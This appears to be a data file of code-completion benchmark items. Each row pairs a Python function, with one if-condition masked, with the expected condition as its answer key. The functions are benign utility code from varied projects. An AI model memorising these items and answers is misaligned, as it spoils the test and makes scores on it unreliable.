3281,"def _fetch_all_channels(self, force=False):<tab>""""""Fetch all channel feeds from cache or network.""""""<tab>channels = self._get_channel_configs(force=force)<tab>enabled = self._settings.get([""enabled_channels""])<tab>forced = self._settings.get([""forced_channels""])<tab>all_channels = {}<tab>for key, config in channels.items():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if ""url"" not in config:<tab><tab><tab>continue<tab><tab>data = self._get_channel_data(key, config, force=force)<tab><tab>if data is not None:<tab><tab><tab>all_channels[key] = data<tab>return all_channels",if key not in enabled and key not in forced :,174
3282,"def _get_cortex_binary(kmer, cortex_dir):<tab>cortex_bin = None<tab>for check_bin in sorted(glob.glob(os.path.join(cortex_dir, ""bin"", ""cortex_var_*""))):<tab><tab>kmer_check = int(os.path.basename(check_bin).split(""_"")[2])<tab><tab><IF-STMT><tab><tab><tab>cortex_bin = check_bin<tab><tab><tab>break<tab>assert (<tab><tab>cortex_bin is not None<tab>), ""Could not find cortex_var executable in %s for kmer %s"" % (cortex_dir, kmer)<tab>return cortex_bin",if kmer_check >= kmer :,176
3283,"def test_numeric_literals(self):<tab>@udf(BigIntVal(FunctionContext, SmallIntVal))<tab>def fn(context, a):<tab><tab><IF-STMT><tab><tab><tab>return 1729<tab><tab>elif a < 0:<tab><tab><tab>return None<tab><tab>elif a < 10:<tab><tab><tab>return a + 5<tab><tab>else:<tab><tab><tab>return a * 2",if a is None :,92
3284,"def cs(self):<tab>""""""ConfigSpace representation of this search space.""""""<tab>cs = CS.ConfigurationSpace()<tab>for k, v in self.kwvars.items():<tab><tab>if isinstance(v, NestedSpace):<tab><tab><tab>_add_cs(cs, v.cs, k)<tab><tab><IF-STMT><tab><tab><tab>hp = v.get_hp(name=k)<tab><tab><tab>_add_hp(cs, hp)<tab><tab>else:<tab><tab><tab>_rm_hp(cs, k)<tab>return cs","elif isinstance ( v , Space ) :",129
3285,"def lineReceived(self, line):<tab>if self.state == ""connected"":<tab><tab>self.messageFilename = line<tab><tab>self.state = ""gotMessageFilename""<tab>if self.state == ""gotMessageFilename"":<tab><tab>if line:<tab><tab><tab>self.metaInfo.append(line)<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.transport.loseConnection()<tab><tab><tab><tab>return<tab><tab><tab>self.filterMessage()",if not self . metaInfo :,114
3286,"def __init__(self, reg, shtype, shimm, va):<tab>if shimm == 0:<tab><tab><IF-STMT><tab><tab><tab>shtype = S_RRX<tab><tab>elif shtype == S_LSR or shtype == S_ASR:<tab><tab><tab>shimm = 32<tab>self.reg = reg<tab>self.shtype = shtype<tab>self.shimm = shimm<tab>self.va = va",if shtype == S_ROR :,107
3287,"def check_data(self, var_name: str, val: Dict[Any, Any]) -> None:<tab>if not isinstance(val, dict):<tab><tab>raise AssertionError(f""{var_name} is not a dictionary"")<tab>for key, value in val.items():<tab><tab><IF-STMT><tab><tab><tab>raise AssertionError(f""{var_name} has a non-string key"")<tab><tab>check_data(self.value_type, f""{var_name}[{key}]"", value)","if not isinstance ( key , str ) :",118
3288,"def write_conditional_formatting(worksheet):<tab>""""""Write conditional formatting to xml.""""""<tab>df = DifferentialStyle()<tab>wb = worksheet.parent<tab>for cf in worksheet.conditional_formatting:<tab><tab>for rule in cf.rules:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>rule.dxfId = wb._differential_styles.add(rule.dxf)<tab><tab>yield cf.to_tree()",if rule . dxf and rule . dxf != df :,108
3289,"def _find_wordpress_compiler(self):<tab>""""""Find WordPress compiler plugin.""""""<tab>if self.wordpress_page_compiler is not None:<tab><tab>return<tab>plugin_info = self.site.plugin_manager.getPluginByName(""wordpress"", ""PageCompiler"")<tab>if plugin_info is not None:<tab><tab><IF-STMT><tab><tab><tab>self.site.plugin_manager.activatePluginByName(plugin_info.name)<tab><tab><tab>plugin_info.plugin_object.set_site(self.site)<tab><tab>self.wordpress_page_compiler = plugin_info.plugin_object",if not plugin_info . is_activated :,147
3290,"def _confirm(config):<tab>cli.out(""You are about to initialize a Guild environment:"")<tab>for name, val in config.prompt_params:<tab><tab><IF-STMT><tab><tab><tab>cli.out(""  {}:"".format(name))<tab><tab><tab>for x in val:<tab><tab><tab><tab>cli.out(""<tab>{}"".format(x))<tab><tab>else:<tab><tab><tab>cli.out(""  {}: {}"".format(name, val))<tab>return cli.confirm(""Continue?"", default=True)","if isinstance ( val , tuple ) :",121
3291,"def last_ok(nodes):<tab>for i in range(len(nodes) - 1, -1, -1):<tab><tab>if ok_node(nodes[i]):<tab><tab><tab>node = nodes[i]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if ok_node(node.value):<tab><tab><tab><tab><tab>return node.value<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>return None<tab><tab><tab>else:<tab><tab><tab><tab>return nodes[i]<tab>return None","if isinstance ( node , ast . Starred ) :",122
3292,"def _is_binary(fname, limit=80):<tab>try:<tab><tab>with open(fname, ""rb"") as f:<tab><tab><tab>for i in range(limit):<tab><tab><tab><tab>char = f.read(1)<tab><tab><tab><tab>if char == b""\0"":<tab><tab><tab><tab><tab>return True<tab><tab><tab><tab>if char == b""\n"":<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if char == b"""":<tab><tab><tab><tab><tab>return<tab>except OSError as e:<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>raise e<tab>return False",if xp . ON_WINDOWS and is_app_execution_alias ( fname ) :,154
3293,"def render(self):<tab>x = ""<span>""<tab>for idx, arg in enumerate(self.args, start=1):<tab><tab>if isinstance(arg, (tuple, list)):<tab><tab><tab>value, desc = arg<tab><tab>else:<tab><tab><tab>value, desc = arg, arg<tab><tab>attrs = self.attrs.copy()<tab><tab>attrs[""name""] = self.name<tab><tab>attrs[""type""] = ""radio""<tab><tab>attrs[""value""] = value<tab><tab>attrs[""id""] = self.name + str(idx)<tab><tab><IF-STMT><tab><tab><tab>attrs[""checked""] = ""checked""<tab><tab>x += ""<input %s/> %s"" % (attrs, net.websafe(desc))<tab>x += ""</span>""<tab>return x",if self . value == value :,183
3294,"def test01b_gml(self):<tab>""Testing GML output.""<tab>for g in self.geometries.wkt_out:<tab><tab>geom = OGRGeometry(g.wkt)<tab><tab>exp_gml = g.gml<tab><tab><IF-STMT><tab><tab><tab># In GDAL 1.8, the non-conformant GML tag  <gml:GeometryCollection> was<tab><tab><tab># replaced with <gml:MultiGeometry>.<tab><tab><tab>exp_gml = exp_gml.replace(""GeometryCollection"", ""MultiGeometry"")<tab><tab>self.assertEqual(exp_gml, geom.gml)","if GDAL_VERSION >= ( 1 , 8 ) :",159
3295,"def _update_recording(self, frame, config):<tab>""""""Adds a frame to the current video output.""""""<tab># pylint: disable=redefined-variable-type<tab>should_record = config[""is_recording""]<tab>if should_record:<tab><tab><IF-STMT><tab><tab><tab>self.is_recording = True<tab><tab><tab>print(<tab><tab><tab><tab>""Starting recording using %s"", self.video_writer.current_output().name()<tab><tab><tab>)<tab><tab>self.video_writer.write_frame(frame)<tab>elif self.is_recording:<tab><tab>self.is_recording = False<tab><tab>self.video_writer.finish()<tab><tab>print(""Finished recording"")",if not self . is_recording :,166
3296,"def activate(self, ctx):<tab>for idx in ctx.chooser_selection:<tab><tab>func_ea = idaapi.getn_func(idx - 1).startEA<tab><tab>cfunc = helper.decompile_function(func_ea)<tab><tab>obj = api.VariableObject(cfunc.get_lvars()[0], 0)<tab><tab><IF-STMT><tab><tab><tab>NewDeepSearchVisitor(cfunc, 0, obj, cache.temporary_structure).process()",if cfunc :,108
3297,"def finish(self, event, commit=0):<tab>target = self.target<tab>source = self.source<tab>widget = self.initial_widget<tab>root = self.root<tab>try:<tab><tab>del root.__dnd<tab><tab>self.initial_widget.unbind(self.release_pattern)<tab><tab>self.initial_widget.unbind(""<Motion>"")<tab><tab>widget[""cursor""] = self.save_cursor<tab><tab>self.target = self.source = self.initial_widget = self.root = None<tab><tab><IF-STMT><tab><tab><tab>if commit:<tab><tab><tab><tab>target.dnd_commit(source, event)<tab><tab><tab>else:<tab><tab><tab><tab>target.dnd_leave(source, event)<tab>finally:<tab><tab>source.dnd_end(target, event)",if target :,188
3298,"def run_epoch(model: BaseModel, loader, device: str, num_batches: int):<tab>model.eval()<tab>with Ctq(loader) as tq_loader:<tab><tab>for batch_idx, data in enumerate(tq_loader):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>process(model, data, device)<tab><tab><tab>else:<tab><tab><tab><tab>break",if batch_idx < num_batches :,99
3299,"def find(d, target):<tab>remainingDicts = [d]<tab>while len(remainingDicts) > 0:<tab><tab>current = remainingDicts.pop()<tab><tab>for k, v in current.iteritems():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return v<tab><tab><tab>if isinstance(v, dict):<tab><tab><tab><tab>remainingDicts.insert(0, v)<tab>return None",if k == target :,98
3300,"def node_exists(self, jid=None, node=None, ifrom=None):<tab>with self.lock:<tab><tab>if jid is None:<tab><tab><tab>jid = self.xmpp.boundjid.full<tab><tab>if node is None:<tab><tab><tab>node = """"<tab><tab>if ifrom is None:<tab><tab><tab>ifrom = """"<tab><tab>if isinstance(ifrom, JID):<tab><tab><tab><IF-STMT><tab><tab>if (jid, node, ifrom) not in self.nodes:<tab><tab><tab>return False<tab><tab>return True",ifrom = ifrom . full,136
3301,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 8:<tab><tab><tab>self.set_time(d.getVarInt64())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_level(d.getVarInt32())<tab><tab><tab>continue<tab><tab>if tt == 26:<tab><tab><tab>self.set_log_message(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 16 :,152
3302,"def _merge_dict(d1, d2):<tab># Modifies d1 in-place to take values from d2<tab># if the nested keys from d2 are present in d1.<tab># https://stackoverflow.com/a/10704003/4488789<tab>for k, v2 in d2.items():<tab><tab>v1 = d1.get(k)  # returns None if v1 has no such key<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""{} is not recognized by client_config"".format(k))<tab><tab>if isinstance(v1, Mapping) and isinstance(v2, Mapping):<tab><tab><tab>_merge_dict(v1, v2)<tab><tab>else:<tab><tab><tab>d1[k] = v2<tab>return d1",if v1 is None :,184
3303,"def build_and_apply_filters(query, objects, filter_func):<tab>if objects is not None:<tab><tab>if isinstance(objects, str):<tab><tab><tab>query = query.filter(filter_func(objects))<tab><tab><IF-STMT><tab><tab><tab>t = []<tab><tab><tab>for obj in objects:<tab><tab><tab><tab>t.append(filter_func(obj))<tab><tab><tab>query = query.filter(or_(*t))<tab>return query","elif isinstance ( objects , list ) :",111
3304,"def _worker_task(self, num: int):<tab>while True:<tab><tab>try_ = 0<tab><tab>f = self.q.get()<tab><tab>while try_ <= self.retries:<tab><tab><tab>rr = f()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>try_ += 1<tab><tab>with self.stat_lock:<tab><tab><tab>self.exit_stat |= rr.ret_val<tab><tab>self.q.task_done()",if not rr . retry :,115
3305,"def get_benchmark_id_title_map(input_tree):<tab>input_root = input_tree.getroot()<tab>ret = {}<tab>for namespace in [XCCDF11_NS, XCCDF12_NS]:<tab><tab>candidates = []<tab><tab>scrape_benchmarks(input_root, namespace, candidates)<tab><tab>for _, elem in candidates:<tab><tab><tab>_id = elem.get(""id"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>title = ""<unknown>""<tab><tab><tab>for element in elem.findall(""{%s}title"" % (namespace)):<tab><tab><tab><tab>title = element.text<tab><tab><tab><tab>break<tab><tab><tab>ret[_id] = title<tab>return ret",if _id is None :,171
3306,"def _call_tensor_ufunc(self, x1, x2, out=None, where=None):<tab><IF-STMT> or hasattr(x2, ""__tensor_ufunc__""):<tab><tab>ufunc = (<tab><tab><tab>x1.__tensor_ufunc__<tab><tab><tab>if hasattr(x1, ""__tensor_ufunc__"")<tab><tab><tab>else x2.__tensor_ufunc__<tab><tab>)<tab><tab>ret = ufunc(type(self), [x1, x2], out, where, **self.ufunc_extra_params)<tab><tab>if ret is NotImplemented:<tab><tab><tab>return<tab><tab>return ret","if hasattr ( x1 , ""__tensor_ufunc__"" )",146
3307,"def remove_namespaces(xml):<tab>for elem in xml.getiterator():<tab><tab>if elem.tag is etree.Comment:<tab><tab><tab>continue<tab><tab>i = elem.tag.find(""}"")<tab><tab><IF-STMT><tab><tab><tab>elem.tag = elem.tag[i + 1 :]<tab>return xml",if i > 0 :,73
3308,"def attributive(adjective, gender=MALE):<tab>w = adjective.lower()<tab># normal => normales<tab>if PLURAL in gender and not is_vowel(w[-1:]):<tab><tab>return w + ""es""<tab># el chico inteligente => los chicos inteligentes<tab>if PLURAL in gender and w.endswith((""a"", ""e"")):<tab><tab>return w + ""s""<tab># el chico alto => los chicos altos<tab>if w.endswith(""o""):<tab><tab>if FEMININE in gender and PLURAL in gender:<tab><tab><tab>return w[:-1] + ""as""<tab><tab>if FEMININE in gender:<tab><tab><tab>return w[:-1] + ""a""<tab><tab><IF-STMT><tab><tab><tab>return w + ""s""<tab>return w",if PLURAL in gender :,197
3309,"def atbash(s):<tab>translated = """"<tab>for i in range(len(s)):<tab><tab>n = ord(s[i])<tab><tab>if s[i].isalpha():<tab><tab><tab>if s[i].isupper():<tab><tab><tab><tab>x = n - ord(""A"")<tab><tab><tab><tab>translated += chr(ord(""Z"") - x)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>x = n - ord(""a"")<tab><tab><tab><tab>translated += chr(ord(""z"") - x)<tab><tab>else:<tab><tab><tab>translated += s[i]<tab>return translated",if s [ i ] . islower ( ) :,143
3310,"def _add_all(self):<tab>stream = BytesIO()<tab>for page in self.graph_manager.pages:<tab><tab>stream.write(page.url.encode(""utf8""))<tab><tab><IF-STMT><tab><tab><tab>for link in page.links:<tab><tab><tab><tab>stream.write(link.url.encode(""utf8""))<tab><tab><tab><tab>stream.write(linesep.encode(""utf8""))<tab>stream.seek(0)<tab>self.frontier.add_seeds(stream)",if not page . has_errors :,120
3311,"def test_bigrand_ranges(self):<tab>for i in [40, 80, 160, 200, 211, 250, 375, 512, 550]:<tab><tab>start = self.gen.randrange(2 ** i)<tab><tab>stop = self.gen.randrange(2 ** (i - 2))<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>self.assertTrue(start <= self.gen.randrange(start, stop) < stop)",if stop <= start :,104
3312,"def on_connect(self, request):<tab>web_socket = WebSocketResponse()<tab>await web_socket.prepare(request)<tab>self.app[""websockets""].add(web_socket)<tab>try:<tab><tab>async for msg in web_socket:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>await self.on_status(None)<tab><tab><tab>elif msg.type == WSMsgType.ERROR:<tab><tab><tab><tab>print(<tab><tab><tab><tab><tab>""web socket connection closed with exception %s""<tab><tab><tab><tab><tab>% web_socket.exception()<tab><tab><tab><tab>)<tab>finally:<tab><tab>self.app[""websockets""].discard(web_socket)<tab>return web_socket",if msg . type == WSMsgType . TEXT :,177
3313,"def __cut_all(self, sentence):<tab>dag = self.get_DAG(sentence)<tab>old_j = -1<tab>for k, L in iteritems(dag):<tab><tab>if len(L) == 1 and k > old_j:<tab><tab><tab>yield sentence[k : L[0] + 1]<tab><tab><tab>old_j = L[0]<tab><tab>else:<tab><tab><tab>for j in L:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>yield sentence[k : j + 1]<tab><tab><tab><tab><tab>old_j = j",if j > k :,137
3314,def filter_forms(forms):<tab>result = []<tab>seen = set()<tab>for form in forms:<tab><tab>if form in self._lemma_pos_offset_map:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if form not in seen:<tab><tab><tab><tab><tab>result.append(form)<tab><tab><tab><tab><tab>seen.add(form)<tab>return result,if pos in self . _lemma_pos_offset_map [ form ] :,100
3315,"def __init__(self, el):<tab>self.elements = list(el)<tab>parameters = {}<tab>tokens = []<tab>token_quote = ""@""<tab>for key, value in el.attrib.items():<tab><tab>if key == ""token_quote"":<tab><tab><tab>token_quote = value<tab><tab><IF-STMT><tab><tab><tab>for token in value.split("",""):<tab><tab><tab><tab>tokens.append((token, REQUIRED_PARAMETER))<tab><tab>elif key.startswith(""token_""):<tab><tab><tab>token = key[len(""token_"") :]<tab><tab><tab>tokens.append((token, value))<tab>for name, default in tokens:<tab><tab>parameters[name] = (token_quote, default)<tab>self.parameters = parameters","if key == ""tokens"" :",170
3316,"def setPositionAfterSort(self, sortChildren):<tab>c = self<tab>p = c.p<tab>p_v = p.v<tab>parent = p.parent()<tab>parent_v = p._parentVnode()<tab>if sortChildren:<tab><tab>p = parent or c.rootPosition()<tab>else:<tab><tab><IF-STMT><tab><tab><tab>p = parent.firstChild()<tab><tab>else:<tab><tab><tab>p = leoNodes.Position(parent_v.children[0])<tab><tab>while p and p.v != p_v:<tab><tab><tab>p.moveToNext()<tab><tab>p = p or parent<tab>return p",if parent :,153
3317,"def next(self):<tab>while not self.closed or not self._buffer.empty():<tab><tab># input stream<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>chunck = next(self._input_iterator)<tab><tab><tab><tab>return chunck<tab><tab><tab>except StopIteration:<tab><tab><tab><tab>self.closed = True<tab><tab><tab><tab>raise StopIteration()<tab><tab><tab>except Exception as ex:<tab><tab><tab><tab>log.error(""Failed downloading: %s"" % ex)<tab><tab>else:<tab><tab><tab># in/out stream<tab><tab><tab>try:<tab><tab><tab><tab>return self._buffer.get(block=True, timeout=1.0)<tab><tab><tab>except Empty:<tab><tab><tab><tab>pass<tab>raise StopIteration()",if self . _input_iterator :,181
3318,"def _gen_GreaterEqual(self, args, ret_type):<tab>result = []<tab>for lhs, rhs in pairwise(args):<tab><tab>if ret_type == real_type:<tab><tab><tab>result.append(self.builder.fcmp_ordered("">="", lhs, rhs))<tab><tab><IF-STMT><tab><tab><tab>result.append(self.builder.icmp_signed("">="", lhs, rhs))<tab><tab>else:<tab><tab><tab>raise CompileError()<tab>return reduce(self.builder.and_, result)",elif ret_type == int_type :,120
3319,"def save_settings(self, settings):<tab>for setting in self.settings:<tab><tab>setting_obj = settings[setting]<tab><tab>new_value = self.cleaned_data.get(setting)<tab><tab>if setting_obj.python_type == ""image"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.save_image(setting_obj, new_value)<tab><tab><tab>elif self.cleaned_data.get(""%s_delete"" % setting):<tab><tab><tab><tab>self.delete_image(setting_obj)<tab><tab>else:<tab><tab><tab>self.save_setting(setting_obj, new_value)",if new_value and new_value != self . initial . get ( setting ) :,160
3320,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>length = d.getVarInt32()<tab><tab><tab>tmp = ProtocolBuffer.Decoder(d.buffer(), d.pos(), d.pos() + length)<tab><tab><tab>d.skip(length)<tab><tab><tab>self.add_events().TryMerge(tmp)<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_timeout_seconds(d.getDouble())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 17 :,167
3321,"def _trim_steps(self, num_steps):<tab>""""""Trims a given number of steps from the end of the sequence.""""""<tab>steps_trimmed = 0<tab>for i in reversed(range(len(self._events))):<tab><tab>if self._events[i].event_type == PolyphonicEvent.STEP_END:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>del self._events[i + 1 :]<tab><tab><tab><tab>break<tab><tab><tab>steps_trimmed += 1<tab><tab>elif i == 0:<tab><tab><tab>self._events = [<tab><tab><tab><tab>PolyphonicEvent(event_type=PolyphonicEvent.START, pitch=None)<tab><tab><tab>]<tab><tab><tab>break",if steps_trimmed == num_steps :,171
3322,"def save(self):<tab>data = self.cleaned_data<tab>previous_data = google_integration_model.get_by_account_id(self.account_id)<tab>if previous_data:<tab><tab>previous_file = previous_data.get(""file_id"")<tab>else:<tab><tab>previous_file = None<tab>json_key_file = data.get(""json_key"")<tab>if json_key_file:<tab><tab>data[""file_id""] = files_model.add(json_key_file)<tab><tab>del data[""json_key""]<tab><tab><IF-STMT><tab><tab><tab>files_model.delete(previous_file)<tab>google_integration_model.save(data, account_id=self.account_id)",if previous_file :,178
3323,"def _register(self, class_):<tab>with self.lock:<tab><tab>table, slots = self._schema(class_)<tab><tab>cur = self.db.execute(""PRAGMA table_info(%s)"" % table)<tab><tab>available = cur.fetchall()<tab><tab><IF-STMT><tab><tab><tab>available = [row[1] for row in available]<tab><tab><tab>missing_slots = (s for s in slots if s not in available)<tab><tab><tab>for slot in missing_slots:<tab><tab><tab><tab>self.db.execute(""ALTER TABLE %s ADD COLUMN %s TEXT"" % (table, slot))<tab><tab>else:<tab><tab><tab>self.db.execute(<tab><tab><tab><tab>""CREATE TABLE %s (%s)""<tab><tab><tab><tab>% (table, "", "".join(""%s TEXT"" % s for s in slots))<tab><tab><tab>)",if available :,195
3324,"def describe_auto_scaling_instances(self, instance_ids):<tab>instance_states = []<tab>for group in self.autoscaling_groups.values():<tab><tab>instance_states.extend(<tab><tab><tab>[<tab><tab><tab><tab>x<tab><tab><tab><tab>for x in group.instance_states<tab><tab><tab><tab><IF-STMT><tab><tab><tab>]<tab><tab>)<tab>return instance_states",if not instance_ids or x . instance . id in instance_ids,104
3325,"def add_nicknames(self, fields, data):<tab>""""""Read the NICKNAME property of a VCard.""""""<tab>for nick in self.split_unescaped(data, "",""):<tab><tab>nickname = nick.strip()<tab><tab><IF-STMT><tab><tab><tab>name = Name()<tab><tab><tab>name.set_nick_name(self.unesc(nickname))<tab><tab><tab>self.person.add_alternate_name(name)",if nickname :,105
3326,"def while1_test(a, b, c):<tab>while 1:<tab><tab><IF-STMT><tab><tab><tab>if b:<tab><tab><tab><tab>a = 3<tab><tab><tab><tab>b = 0<tab><tab><tab>elif c:<tab><tab><tab><tab>c = 0<tab><tab><tab>else:<tab><tab><tab><tab>a += b + c<tab><tab><tab><tab>break<tab>return a, b, c",if a != 2 :,94
3327,"def get_stream(conf, reload=False):<tab>if not conf:<tab><tab>return conf<tab># we can have 'stream' or 'class' or 'filename'<tab>if ""class"" in conf:<tab><tab>class_name = conf.pop(""class"")<tab><tab><IF-STMT><tab><tab><tab>cls = globals()[class_name]<tab><tab><tab>inst = cls(**conf)<tab><tab>else:<tab><tab><tab>inst = resolve_name(class_name, reload=reload)(**conf)<tab>elif ""stream"" in conf:<tab><tab>inst = conf[""stream""]<tab>elif ""filename"" in conf:<tab><tab>inst = FileStream(**conf)<tab>else:<tab><tab>raise ValueError(""stream configuration invalid"")<tab>return {""stream"": inst}","if not ""."" in class_name :",179
3328,"def check_physical(self, line):<tab>""""""Run all physical checks on a raw input line.""""""<tab>self.physical_line = line<tab>for name, check, argument_names in self._physical_checks:<tab><tab>self.init_checker_state(name, argument_names)<tab><tab>result = self.run_check(check, argument_names)<tab><tab><IF-STMT><tab><tab><tab>(offset, text) = result<tab><tab><tab>self.report_error(self.line_number, offset, text, check)<tab><tab><tab>if text[:4] == ""E101"":<tab><tab><tab><tab>self.indent_char = line[0]",if result is not None :,154
3329,"def delete_oidc_session_tokens(session):<tab>if session:<tab><tab>if ""oidc_access_token"" in session:<tab><tab><tab>del session[""oidc_access_token""]<tab><tab>if ""oidc_id_token"" in session:<tab><tab><tab>del session[""oidc_id_token""]<tab><tab>if ""oidc_id_token_expiration"" in session:<tab><tab><tab>del session[""oidc_id_token_expiration""]<tab><tab><IF-STMT><tab><tab><tab>del session[""oidc_login_next""]<tab><tab>if ""oidc_refresh_token"" in session:<tab><tab><tab>del session[""oidc_refresh_token""]<tab><tab>if ""oidc_state"" in session:<tab><tab><tab>del session[""oidc_state""]","if ""oidc_login_next"" in session :",179
3330,"def _fix_exception_context(new_exc, old_exc):<tab># Context may not be correct, so find the end of the chain<tab>while 1:<tab><tab>exc_context = new_exc.__context__<tab><tab>if exc_context is old_exc:<tab><tab><tab># Context is already set correctly (see issue 20317)<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>new_exc = exc_context<tab># Change the end of the chain to point to the exception<tab># we expect it to reference<tab>new_exc.__context__ = old_exc",if exc_context is None or exc_context is frame_exc :,151
3331,"def _write_all(self, out):<tab>while len(out) > 0:<tab><tab>n = self.sock.send(out)<tab><tab>if n <= 0:<tab><tab><tab>raise EOFError()<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>out = out[n:]<tab>return",if n == len ( out ) :,76
3332,"def view(input_path):<tab>if not exists(input_path):<tab><tab>raise IOError(""{0} not found"".format(input_path))<tab>ua = None<tab>bundle_info = None<tab>try:<tab><tab>archive = archive_factory(input_path)<tab><tab><IF-STMT><tab><tab><tab>raise NotMatched(""No matching archive type found"")<tab><tab>ua = archive.unarchive_to_temp()<tab><tab>bundle_info = ua.bundle.info<tab>finally:<tab><tab>if ua is not None:<tab><tab><tab>ua.remove()<tab>return bundle_info",if archive is None :,139
3333,"def _line_generator(fh, skip_blanks=False, strip=True):<tab>for line in fh:<tab><tab>if strip:<tab><tab><tab>line = line.strip()<tab><tab>skip = False<tab><tab>if skip_blanks:<tab><tab><tab>skip = line.isspace() or not line<tab><tab><IF-STMT><tab><tab><tab>yield line",if not skip :,82
3334,"def migrate_key(key, source, target):<tab>if source in config and key in config[source]:<tab><tab>if config.get(target) is None:<tab><tab><tab># make sure we have a serial tree<tab><tab><tab>config[target] = {}<tab><tab><IF-STMT><tab><tab><tab># only copy over if it's not there yet<tab><tab><tab>config[target][key] = config[source][key]<tab><tab># delete feature flag<tab><tab>del config[source][key]<tab><tab>return True<tab>return False",if key not in config [ target ] :,128
3335,"def get_params(self):<tab>if not hasattr(self, ""input_space""):<tab><tab>raise AttributeError(""Input space has not been provided."")<tab>rval = []<tab>for layer in self.layers:<tab><tab>for param in layer.get_params():<tab><tab><tab>if param.name is None:<tab><tab><tab><tab>logger.info(type(layer))<tab><tab>layer_params = layer.get_params()<tab><tab>assert not isinstance(layer_params, set)<tab><tab>for param in layer_params:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>rval.append(param)<tab>rval = [elem for elem in rval if elem not in self.freeze_set]<tab>assert all([elem.name is not None for elem in rval])<tab>return rval",if param not in rval :,181
3336,"def _build_kwargs_string(cls, expectation):<tab>kwargs = []<tab>for k, v in expectation[""kwargs""].items():<tab><tab>if k == ""column"":<tab><tab><tab># make the column a positional argument<tab><tab><tab>kwargs.insert(0, ""{}='{}'"".format(k, v))<tab><tab><IF-STMT><tab><tab><tab># Put strings in quotes<tab><tab><tab>kwargs.append(""{}='{}'"".format(k, v))<tab><tab>else:<tab><tab><tab># Pass other types as is<tab><tab><tab>kwargs.append(""{}={}"".format(k, v))<tab>return "", "".join(kwargs)","elif isinstance ( v , str ) :",143
3337,"def binary_search(_list, left, right, target):<tab>if right >= left:<tab><tab>mid = (left + right) // 2<tab><tab># if element is present at the mid itself<tab><tab>if _list[mid] == target:<tab><tab><tab>return mid<tab><tab># If the element is smaller than mid, then it<tab><tab># can only be present in the left subarray<tab><tab><IF-STMT><tab><tab><tab>return binary_search(_list, left, mid - 1, target)<tab><tab># Else the element can only be present in the right<tab><tab>return binary_search(_list, mid + 1, right, target)<tab>return False",if _list [ mid ] > target :,157
3338,"def _set_name(self, name):<tab># Sanitize the file name so that it can't be dangerous.<tab>if name is not None:<tab><tab># Just use the basename of the file -- anything else is dangerous.<tab><tab>name = os.path.basename(name)<tab><tab># File names longer than 255 characters can cause problems on older OSes.<tab><tab><IF-STMT><tab><tab><tab>name, ext = os.path.splitext(name)<tab><tab><tab>name = name[: 255 - len(ext)] + ext<tab>self._name = name",if len ( name ) > 255 :,132
3339,"def scan_iter(self, match=None, count=None):<tab>nodes = await self.cluster_nodes()<tab>for node in nodes:<tab><tab><IF-STMT><tab><tab><tab>cursor = ""0""<tab><tab><tab>while cursor != 0:<tab><tab><tab><tab>pieces = [cursor]<tab><tab><tab><tab>if match is not None:<tab><tab><tab><tab><tab>pieces.extend([""MATCH"", match])<tab><tab><tab><tab>if count is not None:<tab><tab><tab><tab><tab>pieces.extend([""COUNT"", count])<tab><tab><tab><tab>response = await self.execute_command_on_nodes([node], ""SCAN"", *pieces)<tab><tab><tab><tab>cursor, data = list(response.values())[0]<tab><tab><tab><tab>for item in data:<tab><tab><tab><tab><tab>yield item","if ""master"" in node [ ""flags"" ] :",185
3340,"def drf_url(context, viewname, *args, **kwargs):<tab>""""""Helper for DjangoRestFramework's ``reverse`` in templates.""""""<tab>request = context.get(""request"")<tab>if request:<tab><tab><IF-STMT><tab><tab><tab>request.versioning_scheme = api_settings.DEFAULT_VERSIONING_CLASS()<tab><tab>request.version = request.versioning_scheme.determine_version(<tab><tab><tab>request, *args, **kwargs<tab><tab>)<tab>return drf_reverse(viewname, request=request, args=args, kwargs=kwargs)","if not hasattr ( request , ""versioning_scheme"" ) :",140
3341,"def __call__(self, ctx):<tab>if ctx.range and ctx.value:<tab><tab><IF-STMT><tab><tab><tab>ctx.range.raw_value = ctx.value<tab><tab><tab>return<tab><tab>scalar = ctx.meta.get(""scalar"", False)<tab><tab>if not scalar:<tab><tab><tab>ctx.range = ctx.range.resize(len(ctx.value), len(ctx.value[0]))<tab><tab>self._write_value(ctx.range, ctx.value, scalar)",if self . raw :,117
